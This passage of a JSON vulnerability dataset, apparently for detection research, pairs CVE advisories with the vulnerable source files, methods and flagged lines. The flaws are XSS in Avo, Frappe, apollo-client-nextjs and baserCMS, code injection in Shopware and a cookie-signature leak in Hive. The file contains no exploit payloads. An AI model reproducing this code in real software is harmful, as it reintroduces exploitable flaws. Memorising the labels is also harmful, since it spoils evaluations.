\"/\");',\n\t\t\t!undoPath\n\t\t\t\t? `${RuntimeGlobals.publicPath} = scriptUrl;`\n\t\t\t\t: `${RuntimeGlobals.publicPath} = scriptUrl + ${JSON.stringify(\n\t\t\t\t\t\tundoPath\n\t\t\t\t\t)};`\n\t\t]);\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 53,
          "content": "\t\t\t\t\t\t\t\"if (document.currentScript)\","
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.4,
    "cvss_version": 3.1
  },
  {
    "id": 88,
    "cve": "CVE-2024-22191",
    "description": "Avo is a framework to create admin panels for Ruby on Rails apps. A stored cross-site scripting (XSS) vulnerability was found in the key_value field of Avo v3.2.3 and v2.46.0. This vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim's browser. The value of the key_value is inserted directly into the HTML code. In the current version of Avo (possibly also older versions), the value is not properly sanitized before it is inserted into the HTML code. This vulnerability could be used to steal sensitive information from victims that could be used to hijack victims' accounts or redirect them to malicious websites. Avo 3.2.4 and 2.47.0 include a fix for this issue. Users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/javascript/js/controllers/fields/key_value_controller.js",
          "content": "/* eslint-disable max-len */\nimport { Controller } from '@hotwired/stimulus'\nimport { castBoolean } from '../../helpers/cast_boolean'\n\nexport default class extends Controller {\n  static targets = ['input', 'controller', 'rows']\n\n  fieldValue = []\n\n  options = {}\n\n  get keyInputDisabled() {\n    return !this.options.editable || this.options.disable_editing_keys\n  }\n\n  get valueInputDisabled() {\n    return !this.options.editable\n  }\n\n  connect() {\n    this.setOptions()\n\n    try {\n      const objectValue = JSON.parse(this.inputTarget.value)\n      Object.keys(objectValue).forEach((key) => this.fieldValue.push([key, objectValue[key]]))\n    } catch (error) {\n      this.fieldValue = []\n    }\n\n    this.updateKeyValueComponent()\n  }\n\n  addRow() {\n    if (this.options.disable_adding_rows || !this.options.editable) return\n    this.fieldValue.push(['', ''])\n    this.updateKeyValueComponent()\n    this.focusLastRow()\n  }\n\n  deleteRow(event) {\n    if (this.options.disable_deleting_rows || !this.options.editable) return\n    const { index } = event.params\n    this.fieldValue.splice(index, 1)\n    this.updateTextareaInput()\n    this.updateKeyValueComponent()\n  }\n\n  focusLastRow() {\n    return this.rowsTarget.querySelector('.flex.key-value-row:last-child .key-value-input-key').focus()\n  }\n\n  valueFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][1] = value\n\n    this.updateTextareaInput()\n  }\n\n  keyFieldUpdated(event) {\n    const { value } = event.target\n    const { index } = event.target.dataset\n    this.fieldValue[index][0] = value\n\n    this.updateTextareaInput()\n  }\n\n  updateTextareaInput() {\n    if (!this.hasInputTarget) return\n    let result = {}\n    if (this.fieldValue && this.fieldValue.length > 0) {\n      result = Object.assign(...this.fieldValue.map(([key, val]) => ({ [key]: val })))\n    }\n    this.inputTarget.innerText = JSON.stringify(result)\n    this.inputTarget.dispatchEvent(new Event('input'))\n  }\n\n  updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }\n\n  interpolatedRow(key, value, index) {\n    let result = `<div class=\"flex key-value-row\">\n      ${this.inputField('key', index, key, value)}\n      ${this.inputField('value', index, key, value)}`\n    if (this.options.editable) {\n      result += `<a\n  href=\"javascript:void(0);\"\n  data-key-value-index-param=\"${index}\"\n  data-action=\"click->key-value#deleteRow\"\n  title=\"${this.options.delete_text}\"\n  data-tippy=\"tooltip\"\n  data-button=\"delete-row\"\n  tabindex=\"-1\"\n  ${this.options.disable_deleting_rows ? \"disabled='disabled'\" : ''}\n  class=\"flex items-center justify-center p-2 px-3 border-none ${this.options.disable_deleting_rows ? 'cursor-not-allowed' : ''}\"\n><svg class=\"pointer-events-none text-gray-500 h-5 hover:text-gray-500\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" viewBox=\"0 0 24 24\" stroke=\"currentColor\"><path d=\"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16\"></path></svg></a>`\n    }\n    result += '</div>'\n\n    return result\n  }\n\n  inputField(id = 'key', index, key, value) {\n    const inputValue = id === 'key' ? key : value\n\n    return `<input\n  class=\"${this.options.inputClasses} focus:bg-gray-100 !rounded-none border-gray-600 border-r border-l-0 border-b-0 border-t-0 focus:border-gray-300 w-1/2 focus:outline-none outline-none key-value-input-${id}\"\n  data-action=\"input->key-value#${id}FieldUpdated\"\n  placeholder=\"${this.options[`${id}_label`]}\"\n  data-index=\"${index}\"\n  ${this[`${id}InputDisabled`] ? \"disabled='disabled'\" : ''}\n  value=\"${typeof inputValue === 'undefined' || inputValue === null ? '' : inputValue}\"\n/>`\n  }\n\n  setOptions() {\n    let fieldOptions\n\n    try {\n      fieldOptions = JSON.parse(this.controllerTarget.dataset.options)\n    } catch (error) {\n      fieldOptions = {}\n    }\n    this.options = {\n      ...fieldOptions,\n      inputClasses: this.controllerTarget.dataset.inputClasses,\n      editable: castBoolean(this.controllerTarget.dataset.editable),\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "updateKeyValueComponent() {\n    let result = ''\n    let index = 0\n    this.fieldValue.forEach((row) => {\n      const [key, value] = row\n      result += this.interpolatedRow(key, value, index)\n      index++\n    })\n    this.rowsTarget.innerHTML = result\n    window.initTippy()\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 83,
          "content": "      result += this.interpolatedRow(key, value, index)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 7.3,
    "cvss_version": 3.1
  },
  {
    "id": 196,
    "cve": "CVE-2025-52896",
    "description": "Frappe is a full-stack web application framework. Prior to versions 14.94.2 and 15.57.0, authenticated users could upload carefully crafted malicious files via Data Import, leading to cross-site scripting (XSS). This issue has been patched in versions 14.94.2 and 15.57.0. There are no workarounds for this issue other than upgrading.",
    "vulnerability": {
      "file_level": [
        {
          "name": "frappe/public/js/frappe/form/controls/attach.js",
          "content": "frappe.ui.form.ControlAttach = class ControlAttach extends frappe.ui.form.ControlData {\n\tmake_input() {\n\t\tlet me = this;\n\t\tthis.$input = $('<button class=\"btn btn-default btn-sm btn-attach\">')\n\t\t\t.html(__(\"Attach\"))\n\t\t\t.prependTo(me.input_area)\n\t\t\t.on({\n\t\t\t\tclick: function () {\n\t\t\t\t\tme.on_attach_click();\n\t\t\t\t},\n\t\t\t\tattach_doc_image: function () {\n\t\t\t\t\tme.on_attach_doc_image();\n\t\t\t\t},\n\t\t\t});\n\t\tthis.$value = $(\n\t\t\t`<div class=\"attached-file flex justify-between align-center\">\n\t\t\t\t<div class=\"ellipsis\">\n\t\t\t\t${frappe.utils.icon(\"es-line-link\", \"sm\")}\n\t\t\t\t\t<a class=\"attached-file-link\" target=\"_blank\"></a>\n\t\t\t\t</div>\n\t\t\t\t<div>\n\t\t\t\t\t<a class=\"btn btn-xs btn-default\" data-action=\"reload_attachment\">${__(\"Reload File\")}</a>\n\t\t\t\t\t<a class=\"btn btn-xs btn-default\" data-action=\"clear_attachment\">${__(\"Clear\")}</a>\n\t\t\t\t</div>\n\t\t\t</div>`\n\t\t)\n\t\t\t.prependTo(me.input_area)\n\t\t\t.toggle(false);\n\t\tthis.input = this.$input.get(0);\n\t\tthis.set_input_attributes();\n\t\tthis.has_input = true;\n\n\t\tfrappe.utils.bind_actions_with_object(this.$value, this);\n\t\tthis.toggle_reload_button();\n\t}\n\tclear_attachment() {\n\t\tlet me = this;\n\t\tif (this.frm) {\n\t\t\tme.parse_validate_and_set_in_model(null);\n\t\t\tme.refresh();\n\t\t\tme.frm.attachments.remove_attachment_by_filename(me.value, async () => {\n\t\t\t\tawait me.parse_validate_and_set_in_model(null);\n\t\t\t\tme.refresh();\n\t\t\t\tme.frm.doc.docstatus == 1 ? me.frm.save(\"Update\") : me.frm.save();\n\t\t\t});\n\t\t} else {\n\t\t\tthis.dataurl = null;\n\t\t\tthis.fileobj = null;\n\t\t\tthis.set_input(null);\n\t\t\tthis.parse_validate_and_set_in_model(null);\n\t\t\tthis.refresh();\n\t\t}\n\t}\n\treload_attachment() {\n\t\tif (this.file_uploader) {\n\t\t\tthis.file_uploader.uploader.upload_files();\n\t\t}\n\t}\n\ton_attach_click() {\n\t\tthis.set_upload_options();\n\t\tthis.file_uploader = new frappe.ui.FileUploader(this.upload_options);\n\t}\n\ton_attach_doc_image() {\n\t\tthis.set_upload_options();\n\t\tthis.upload_options.restrictions.allowed_file_types = [\"image/*\"];\n\t\tthis.file_uploader = new frappe.ui.FileUploader(this.upload_options);\n\t}\n\tset_upload_options() {\n\t\tlet options = {\n\t\t\tallow_multiple: false,\n\t\t\ton_success: (file) => {\n\t\t\t\tthis.on_upload_complete(file);\n\t\t\t\tthis.toggle_reload_button();\n\t\t\t},\n\t\t\trestrictions: {},\n\t\t};\n\n\t\tif (this.frm) {\n\t\t\toptions.doctype = this.frm.doctype;\n\t\t\toptions.docname = this.frm.docname;\n\t\t\toptions.fieldname = this.df.fieldname;\n\t\t\toptions.make_attachments_public = this.df.make_attachment_public\n\t\t\t\t? 1\n\t\t\t\t: this.frm.meta.make_attachments_public;\n\t\t}\n\n\t\tif (this.df.options) {\n\t\t\tObject.assign(options, this.df.options);\n\t\t}\n\t\tthis.upload_options = options;\n\t}\n\n\tset_input(value, dataurl) {\n\t\tthis.last_value = this.value;\n\t\tthis.value = value;\n\t\tif (this.value) {\n\t\t\t// value can also be using this format: FILENAME,DATA_URL\n\t\t\t// Important: We have to be careful because normal filenames may also contain \",\"\n\t\t\tlet file_url_parts = this.value.match(/^([^:]+),(.+):(.+)$/);\n\t\t\tlet filename;\n\t\t\tif (file_url_parts) {\n\t\t\t\tfilename = file_url_parts[1];\n\t\t\t\tdataurl = file_url_parts[2] + \":\" + file_url_parts[3];\n\t\t\t}\n\t\t\tif (this.$input && this.$value) {\n\t\t\t\tthis.$input.toggle(false);\n\t\t\t\tthis.$value\n\t\t\t\t\t.toggle(true)\n\t\t\t\t\t.find(\".attached-file-link\")\n\t\t\t\t\t.html(filename || this.value)\n\t\t\t\t\t.attr(\"href\", dataurl || this.value);\n\t\t\t} else {\n\t\t\t\tthis.$wrapper.html(`\n\t\t\t\t\t  <div class=\"attached-file flex justify-between align-center\">\n\t\t\t\t\t\t<div class=\"ellipsis\">\n\t\t\t\t\t\t  <a href=\"${dataurl || this.value}\" target=\"_blank\">${filename || this.value}</a>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t  </div>\n\t\t\t\t`);\n\t\t\t}\n\t\t} else {\n\t\t\tthis.$input.toggle(true);\n\t\t\tthis.$value.toggle(false);\n\t\t}\n\t}\n\n\tget_value() {\n\t\treturn this.value || null;\n\t}\n\n\tasync on_upload_complete(attachment) {\n\t\tif (this.frm) {\n\t\t\tawait this.parse_validate_and_set_in_model(attachment.file_url);\n\t\t\tthis.frm.attachments.update_attachment(attachment);\n\t\t\tthis.frm.doc.docstatus == 1 ? this.frm.save(\"Update\") : this.frm.save();\n\t\t}\n\t\tthis.set_value(attachment.file_url);\n\t}\n\n\ttoggle_reload_button() {\n\t\tthis.$value\n\t\t\t.find('[data-action=\"reload_attachment\"]')\n\t\t\t.toggle(this.file_uploader && this.file_uploader.uploader.files.length > 0);\n\t}\n};\n"
        }
      ],
      "method_level": [
        "set_input(value, dataurl) {\n\t\tthis.last_value = this.value;\n\t\tthis.value = value;\n\t\tif (this.value) {\n\t\t\t// value can also be using this format: FILENAME,DATA_URL\n\t\t\t// Important: We have to be careful because normal filenames may also contain \",\"\n\t\t\tlet file_url_parts = this.value.match(/^([^:]+),(.+):(.+)$/);\n\t\t\tlet filename;\n\t\t\tif (file_url_parts) {\n\t\t\t\tfilename = file_url_parts[1];\n\t\t\t\tdataurl = file_url_parts[2] + \":\" + file_url_parts[3];\n\t\t\t}\n\t\t\tif (this.$input && this.$value) {\n\t\t\t\tthis.$input.toggle(false);\n\t\t\t\tthis.$value\n\t\t\t\t\t.toggle(true)\n\t\t\t\t\t.find(\".attached-file-link\")\n\t\t\t\t\t.html(filename || this.value)\n\t\t\t\t\t.attr(\"href\", dataurl || this.value);\n\t\t\t} else {\n\t\t\t\tthis.$wrapper.html(`\n\t\t\t\t\t  <div class=\"attached-file flex justify-between align-center\">\n\t\t\t\t\t\t<div class=\"ellipsis\">\n\t\t\t\t\t\t  <a href=\"${dataurl || this.value}\" target=\"_blank\">${filename || this.value}</a>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t  </div>\n\t\t\t\t`);\n\t\t\t}\n\t\t} else {\n\t\t\tthis.$input.toggle(true);\n\t\t\tthis.$value.toggle(false);\n\t\t}\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 110,
          "content": "\t\t\t\t\t.html(filename || this.value)"
        },
        {
          "line_no": 116,
          "content": "\t\t\t\t\t\t  <a href=\"${dataurl || this.value}\" target=\"_blank\">${filename || this.value}</a>"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 8.6,
    "cvss_version": 4.0
  },
  {
    "id": 182,
    "cve": "CVE-2024-23841",
    "description": "apollo-client-nextjs is the Apollo Client support for the Next.js App Router. The @apollo/experimental-apollo-client-nextjs NPM package is vulnerable to a cross-site scripting vulnerability. To exploit this vulnerability, an attacker would need to either inject malicious input (e.g. by redirecting a user to a specifically-crafted link) or arrange to have malicious input be returned by a GraphQL server (e.g. by persisting it in a database). To fix this issue, please update to version 0.7.0 or later.",
    "vulnerability": {
      "file_level": [
        {
          "name": "package/src/ssr/dataTransport.ts",
          "content": "import SuperJSON from \"superjson\";\nimport {\n  ApolloSSRDataTransport,\n  ApolloRehydrationCache,\n  ApolloResultCache,\n  ApolloBackgroundQueryTransport,\n} from \"./ApolloRehydrateSymbols\";\nimport type { RehydrationCache } from \"./types\";\nimport { registerLateInitializingQueue } from \"./lateInitializingQueue\";\nimport type { Cache, WatchQueryOptions } from \"@apollo/client\";\nimport invariant from \"ts-invariant\";\n\nexport type DataTransport<T> = Array<T> | { push(...args: T[]): void };\n\ntype DataToTransport = {\n  rehydrate: RehydrationCache;\n  results: Cache.WriteOptions[];\n  backgroundQueries: WatchQueryOptions[];\n};\n\n/**\n * Returns a string of JavaScript that can be used to transport data to the client.\n */\nexport function transportDataToJS(data: DataToTransport) {\n  const key = Symbol.keyFor(ApolloSSRDataTransport);\n  return `(window[Symbol.for(\"${key}\")] ??= []).push(${SuperJSON.stringify(\n    data\n  )})`;\n}\n\n/**\n * Registers a lazy queue that will be filled with data by `transportDataToJS`.\n * All incoming data will be added either to the rehydration cache or the result cache.\n */\nexport function registerDataTransport() {\n  registerLateInitializingQueue(ApolloSSRDataTransport, (data) => {\n    const parsed = SuperJSON.deserialize<DataToTransport>(data);\n    invariant.debug(`received data from the server:`, parsed);\n    Object.assign((window[ApolloRehydrationCache] ??= {}), parsed.rehydrate);\n    (window[ApolloBackgroundQueryTransport] ??= []).push(\n      ...parsed.backgroundQueries\n    );\n    (window[ApolloResultCache] ??= []).push(...parsed.results);\n  });\n}\n"
        }
      ],
      "method_level": [
        "transportDataToJS"
      ],
      "hunk_level": [
        {
          "line_no": 26,
          "content": "  return `(window[Symbol.for(\"${key}\")] ??= []).push(${SuperJSON.stringify("
        },
        {
          "line_no": 27,
          "content": "    data"
        }
      ]
    },
    "cwe": [
      "CWE-80"
    ],
    "severity": "HIGH",
    "cvss_score": 8.2,
    "cvss_version": 3.1
  },
  {
    "id": 1060,
    "cve": "CVE-2024-42355",
    "description": "Shopware, an open ecommerce platform, has a new Twig Tag `sw_silent_feature_call` which silences deprecation messages while triggered in this tag. Prior to versions 6.6.5.1 and 6.5.8.13, it accepts as parameter a string the feature flag name to silence, but this parameter is not escaped properly and allows execution of code. Update to Shopware 6.6.5.1 or 6.5.8.13 to receive a patch. For older versions of 6.2, 6.3,  and 6.4, corresponding security measures are also available via a plugin.",
    "vulnerability": {
      "file_level": [
        {
          "name": "Framework/Adapter/Twig/Node/FeatureCallSilentToken.php",
          "content": "<?php declare(strict_types=1);\n\nnamespace Shopware\\Core\\Framework\\Adapter\\Twig\\Node;\n\nuse Shopware\\Core\\Framework\\Log\\Package;\nuse Twig\\Compiler;\nuse Twig\\Node\\Node;\n\n#[Package('core')]\nclass FeatureCallSilentToken extends Node\n{\n    public function __construct(\n        private readonly string $flag,\n        Node $body,\n        int $line,\n        string $tag\n    ) {\n        parent::__construct(['body' => $body], [], $line, $tag);\n    }\n\n    public function compile(Compiler $compiler): void\n    {\n        $compiler\n            ->addDebugInfo($this)\n            ->raw('\\Shopware\\Core\\Framework\\Feature::callSilentIfInactive(\\'' . $this->flag . '\\', function () use(&$context) { ')\n            ->subcompile($this->getNode('body'))\n            ->raw('});');\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function compile(Compiler $compiler): void\n    {\n        $compiler\n            ->addDebugInfo($this)\n            ->raw('\\Shopware\\Core\\Framework\\Feature::callSilentIfInactive(\\'' . $this->flag . '\\', function () use(&$context) { ')\n            ->subcompile($this->getNode('body'))\n            ->raw('});');\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 25,
          "content": "            ->raw('\\Shopware\\Core\\Framework\\Feature::callSilentIfInactive(\\'' . $this->flag . '\\', function () use(&$context) { ')"
        }
      ]
    },
    "cwe": [
      "CWE-94",
      "CWE-1336"
    ],
    "severity": "HIGH",
    "cvss_score": 8.3,
    "cvss_version": 3.1
  },
  {
    "id": 328,
    "cve": "CVE-2024-26128",
    "description": "baserCMS is a website development framework. Prior to version 5.0.9, there is a cross-site scripting vulnerability in the content management feature. Version 5.0.9 contains a fix for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "plugins/baser-core/src/View/Helper/BcAdminFormHelper.php",
          "content": "<?php\n/**\n * baserCMS :  Based Website Development Project <https://basercms.net>\n * Copyright (c) NPO baser foundation <https://baserfoundation.org/>\n *\n * @copyright     Copyright (c) NPO baser foundation\n * @link          https://basercms.net baserCMS Project\n * @since         5.0.0\n * @license       https://basercms.net/license/index.html MIT License\n */\n\nnamespace BaserCore\\View\\Helper;\n\nuse BaserCore\\Annotation\\NoTodo;\nuse BaserCore\\Annotation\\Checked;\nuse BaserCore\\Annotation\\UnitTest;\nuse BaserCore\\Event\\BcEventDispatcherTrait;\n\n/**\n * Class BcAdminFormHelper\n */\nclass BcAdminFormHelper extends BcFormHelper\n{\n    /**\n     * Trait\n     */\n    use BcEventDispatcherTrait;\n\n    /**\n     * control\n     * @param string $fieldName\n     * @param array $options\n     * @return string\n     * @checked\n     * @noTodo\n     * @unitTest\n     */\n    public function control(string $fieldName, array $options = []): string\n    {\n        if (empty($options['type'])) {\n            $options['type'] = $this->_inputType($fieldName, $options);\n        }\n        if (!empty($options['type'])) {\n            $options = array_replace_recursive([\n                'label' => false,\n                'legend' => false,\n                'error' => false,\n                'templateVars' => ['tag' => 'span', 'groupTag' => 'span']\n            ], $options);\n            $class = 'bca-hidden__input';\n            $containerClass = 'bca-hidden';\n            $labelClass = $groupContainerClass = $label = '';\n            switch($options['type']) {\n                case 'file':\n                    $class = 'bca-file__input';\n                    $containerClass = 'bca-file';\n                    $options = array_replace_recursive([\n                        'link' => ['class' => 'bca-file__link'],\n                        'class' => 'bca-file__input',\n                        'templateVars' => ['tag' => 'span', 'class' => 'bca-file'],\n                        'deleteSpan' => ['class' => 'bca-file__delete'],\n                        'deleteCheckbox' => ['class' => 'bca-file__delete-input', 'id' => true],\n                        'deleteLabel' => ['class' => 'bca-file__delete-label'],\n                        'figure' => ['class' => 'bca-file__figure'],\n                        'img' => ['class' => 'bca-file__img'],\n                        'figcaption' => ['class' => 'bca-file__figcaption']\n                    ], $options);\n                    break;\n                case 'dateTimePicker':\n                    $containerClass = 'bca-datetimepicker';\n                    $options = array_replace_recursive([\n                        'dateInput' => ['class' => 'bca-datetimepicker__date-input'],\n                        'dateDiv' => ['tag' => 'span', 'class' => 'bca-datetimepicker__date'],\n                        'dateLabel' => ['text' => __d('baser_core', '日付'), 'class' => 'bca-datetimepicker__date-label'],\n                        'timeInput' => ['class' => 'bca-datetimepicker__time-input'],\n                        'timeDiv' => ['tag' => 'span', 'class' => 'bca-datetimepicker__time'],\n                        'timeLabel' => ['text' => '時間', 'class' => 'bca-datetimepicker__time-label']\n                    ], $options);\n                    break;\n                case 'text':\n                case 'password':\n                case 'date':\n                case 'datePicker':\n                case 'tel':\n                case 'email':\n                case 'number':\n                    $class = 'bca-textbox__input';\n                    $containerClass = 'bca-textbox';\n                    $labelClass = 'bca-textbox__label';\n                    break;\n                case 'textarea':\n                    $class = 'bca-textarea__textarea';\n                    $containerClass = 'bca-textarea';\n                    break;\n                case 'checkbox':\n                    $options['templateVars']['labelClass'] = 'bca-checkbox__label';\n                    $class = 'bca-checkbox__input';\n                    $containerClass = 'bca-checkbox';\n                    $labelClass = 'bca-checkbox__label';\n                    if(empty($options['label'])) $options['label'] = '';\n                    break;\n                case 'multiCheckbox':\n                    $class = 'bca-checkbox__input';\n                    $containerClass = 'bca-checkbox';\n                    $labelClass = 'bca-checkbox__label';\n                    $groupContainerClass = 'bca-checkbox-group';\n                    break;\n                case 'select':\n                    $class = 'bca-select__select';\n                    $containerClass = 'bca-select';\n                    break;\n                case 'radio':\n                    $class = 'bca-radio__input';\n                    $containerClass = 'bca-radio';\n                    $labelClass = 'bca-radio__label';\n                    $groupContainerClass = 'bca-radio-group';\n                    break;\n            }\n\n            if (!isset($options['class'])) {\n                $options['class'] = $class;\n            }\n            if (!isset($options['labelOptions'])) {\n                if (!empty($options['label']) && $options['label'] !== true) {\n                    $options['labelOptions'] = ['text' => $options['label'], 'class' => $labelClass];\n                } else {\n                    $options['labelOptions'] = ['class' => $labelClass];\n                }\n            }\n            if ($containerClass) {\n                $options['templateVars']['class'] = $containerClass;\n            }\n            if ($groupContainerClass) {\n                $options['templateVars']['groupClass'] = $groupContainerClass;\n            }\n\n        }\n\n        return parent::control($fieldName, $options);\n    }\n\n    /**\n     * postLink\n     * CSSクラスに bca-submit-token を追加する\n     * @param string $title\n     * @param null $url\n     * @param array $options\n     * @return string\n     * @checked\n     * @noTodo\n     * @unitTest\n     */\n    public function postLink(string $title, $url = null, array $options = []): string\n    {\n        $class = 'bca-submit-token';\n        if(!empty($options['class'])) {\n            $classes = explode(' ', $options['class']);\n            if(!in_array($class, $classes)) {\n                $classes[] = $class;\n            }\n            $options['class'] = implode(' ', $classes);\n        } else {\n                $options['class'] = $class;\n        }\n        return parent::postLink($title, $url, $options);\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "public function control(string $fieldName, array $options = []): string\n    {\n        if (empty($options['type'])) {\n            $options['type'] = $this->_inputType($fieldName, $options);\n        }\n        if (!empty($options['type'])) {\n            $options = array_replace_recursive([\n                'label' => false,\n                'legend' => false,\n                'error' => false,\n                'templateVars' => ['tag' => 'span', 'groupTag' => 'span']\n            ], $options);\n            $class = 'bca-hidden__input';\n            $containerClass = 'bca-hidden';\n            $labelClass = $groupContainerClass = $label = '';\n            switch($options['type']) {\n                case 'file':\n                    $class = 'bca-file__input';\n                    $containerClass = 'bca-file';\n                    $options = array_replace_recursive([\n                        'link' => ['class' => 'bca-file__link'],\n                        'class' => 'bca-file__input',\n                        'templateVars' => ['tag' => 'span', 'class' => 'bca-file'],\n                        'deleteSpan' => ['class' => 'bca-file__delete'],\n                        'deleteCheckbox' => ['class' => 'bca-file__delete-input', 'id' => true],\n                        'deleteLabel' => ['class' => 'bca-file__delete-label'],\n                        'figure' => ['class' => 'bca-file__figure'],\n                        'img' => ['class' => 'bca-file__img'],\n                        'figcaption' => ['class' => 'bca-file__figcaption']\n                    ], $options);\n                    break;\n                case 'dateTimePicker':\n                    $containerClass = 'bca-datetimepicker';\n                    $options = array_replace_recursive([\n                        'dateInput' => ['class' => 'bca-datetimepicker__date-input'],\n                        'dateDiv' => ['tag' => 'span', 'class' => 'bca-datetimepicker__date'],\n                        'dateLabel' => ['text' => __d('baser_core', '日付'), 'class' => 'bca-datetimepicker__date-label'],\n                        'timeInput' => ['class' => 'bca-datetimepicker__time-input'],\n                        'timeDiv' => ['tag' => 'span', 'class' => 'bca-datetimepicker__time'],\n                        'timeLabel' => ['text' => '時間', 'class' => 'bca-datetimepicker__time-label']\n                    ], $options);\n                    break;\n                case 'text':\n                case 'password':\n                case 'date':\n                case 'datePicker':\n                case 'tel':\n                case 'email':\n                case 'number':\n                    $class = 'bca-textbox__input';\n                    $containerClass = 'bca-textbox';\n                    $labelClass = 'bca-textbox__label';\n                    break;\n                case 'textarea':\n                    $class = 'bca-textarea__textarea';\n                    $containerClass = 'bca-textarea';\n                    break;\n                case 'checkbox':\n                    $options['templateVars']['labelClass'] = 'bca-checkbox__label';\n                    $class = 'bca-checkbox__input';\n                    $containerClass = 'bca-checkbox';\n                    $labelClass = 'bca-checkbox__label';\n                    if(empty($options['label'])) $options['label'] = '';\n                    break;\n                case 'multiCheckbox':\n                    $class = 'bca-checkbox__input';\n                    $containerClass = 'bca-checkbox';\n                    $labelClass = 'bca-checkbox__label';\n                    $groupContainerClass = 'bca-checkbox-group';\n                    break;\n                case 'select':\n                    $class = 'bca-select__select';\n                    $containerClass = 'bca-select';\n                    break;\n                case 'radio':\n                    $class = 'bca-radio__input';\n                    $containerClass = 'bca-radio';\n                    $labelClass = 'bca-radio__label';\n                    $groupContainerClass = 'bca-radio-group';\n                    break;\n            }\n\n            if (!isset($options['class'])) {\n                $options['class'] = $class;\n            }\n            if (!isset($options['labelOptions'])) {\n                if (!empty($options['label']) && $options['label'] !== true) {\n                    $options['labelOptions'] = ['text' => $options['label'], 'class' => $labelClass];\n                } else {\n                    $options['labelOptions'] = ['class' => $labelClass];\n                }\n            }\n            if ($containerClass) {\n                $options['templateVars']['class'] = $containerClass;\n            }\n            if ($groupContainerClass) {\n                $options['templateVars']['groupClass'] = $groupContainerClass;\n            }\n\n        }\n\n        return parent::control($fieldName, $options);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "                        'figcaption' => ['class' => 'bca-file__figcaption']"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 1343,
    "cve": "CVE-2024-23945",
    "description": "Signing cookies is an application security feature that adds a digital signature to cookie data to verify its authenticity and integrity. The signature helps prevent malicious actors from modifying the cookie value, which can lead to security vulnerabilities and exploitation. Apache Hive’s service component accidentally exposes the signed cookie to the end user when there is a mismatch in signature between the current and expected cookie. Exposing the correct cookie signature can lead to further exploitation.\n\nThe vulnerable CookieSigner logic was introduced in Apache Hive by HIVE-9710 (1.2.0) and in Apache Spark by SPARK-14987 (2.0.0). The affected components are the following:\n* org.apache.hive:hive-service\n* org.apache.spark:spark-hive-thriftserver_2.11\n* org.apache.spark:spark-hive-thriftserver_2.12",
    "vulnerability": {
      "file_level": [
        {
          "name": "service/src/java/org/apache/hive/service/CookieSigner.java",
          "content": "/*\n * Licensed to the Apache Software Foundation (ASF) under one\n * or more contributor license agreements.  See the NOTICE file\n * distributed with this work for additional information\n * regarding copyright ownership.  The ASF licenses this file\n * to you under the Apache License, Version 2.0 (the\n * \"License\"); you may not use this file except in compliance\n * with the License.  You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.apache.hive.service;\n\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n/**\n * The cookie signer generates a signature based on SHA digest\n * and appends it to the cookie value generated at the\n * server side. It uses SHA digest algorithm to sign and verify signatures.\n */\npublic class CookieSigner {\n  private static final String SIGNATURE = \"&s=\";\n  private static final String SHA_STRING = \"SHA-512\";\n  private byte[] secretBytes;\n  private static final Logger LOG = LoggerFactory.getLogger(CookieSigner.class);\n\n  /**\n   * Constructor\n   * @param secret Secret Bytes\n   */\n  public CookieSigner(byte[] secret) {\n    if (secret == null) {\n      throw new IllegalArgumentException(\" NULL Secret Bytes\");\n    }\n    this.secretBytes = secret.clone();\n  }\n\n  /**\n   * Sign the cookie given the string token as input.\n   * @param str Input token\n   * @return Signed token that can be used to create a cookie\n   */\n  public String signCookie(String str) {\n    if (str == null || str.isEmpty()) {\n      throw new IllegalArgumentException(\"NULL or empty string to sign\");\n    }\n    String signature = getSignature(str);\n\n    LOG.debug(\"Signature generated for {} is {}\", str, signature);\n    return str + SIGNATURE + signature;\n  }\n\n  /**\n   * Verify a signed string and extracts the original string.\n   * @param signedStr The already signed string\n   * @return Raw Value of the string without the signature\n   */\n  public String verifyAndExtract(String signedStr) {\n    int index = signedStr.lastIndexOf(SIGNATURE);\n    if (index == -1) {\n      throw new IllegalArgumentException(\"Invalid input sign: \" + signedStr);\n    }\n    String originalSignature = signedStr.substring(index + SIGNATURE.length());\n    String rawValue = signedStr.substring(0, index);\n    String currentSignature = getSignature(rawValue);\n\n    LOG.debug(\"Signature generated for {} inside verify is {}\", rawValue, currentSignature);\n    if (!MessageDigest.isEqual(originalSignature.getBytes(), 